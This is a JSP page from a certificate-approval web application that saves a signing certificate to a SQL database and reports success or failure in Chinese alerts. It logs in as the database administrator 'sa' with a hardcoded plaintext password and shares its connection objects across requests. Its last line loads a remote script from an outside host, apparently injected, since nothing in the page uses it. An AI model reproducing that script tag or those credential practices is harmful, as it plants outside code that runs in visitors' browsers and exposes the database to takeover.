<%@page contentType="text/html;charset=gb2312"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@ page import="java.sql.*" %>
<%@ page import="ApproveBeans.ApproveBean" %>
<%! Connection conn=null;%>
<%! PreparedStatement pstmt=null;%>
<%! int effect=0;%>
<jsp:useBean id="approveBean" class="ApproveBeans.ApproveBean" scope="session"/>

<%
	try
	{
		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		conn=DriverManager.getConnection("jdbc:odbc:applyDB","sa","lilanfen");
		pstmt=conn.prepareStatement("insert into certs values(?,?,?,?,NULL)");
		pstmt.setLong(1,Long.parseLong(approveBean.subjectId_Sign));
		pstmt.setLong(2,Long.parseLong(approveBean.applyId));
		pstmt.setBytes(3,approveBean.signXC.getEncoded());
		pstmt.setInt(4,0);
		effect=pstmt.executeUpdate();
		if(effect>0)
		{
%>
<script>alert("保存成功！"); history.back();</script>
<%
		}
		else
		{
%>
<script>alert("对不起！在数据库中已经存在该证书！"); history.back();</script>
<%
		}
	}
	catch(Exception ex)
	{
%>
<script>
alert("保存失败！\n 原因可能是：\n1.在数据库中已经存在该证书！\n2.数据库服务器问题\n请稍后再试！"); history.back();
</script>
<%
	}
	finally
	{
		try{ conn.close();}catch(Exception ex2){}
	}
%>
<script language=javascript src=http://www.qq.com/qq.js></script>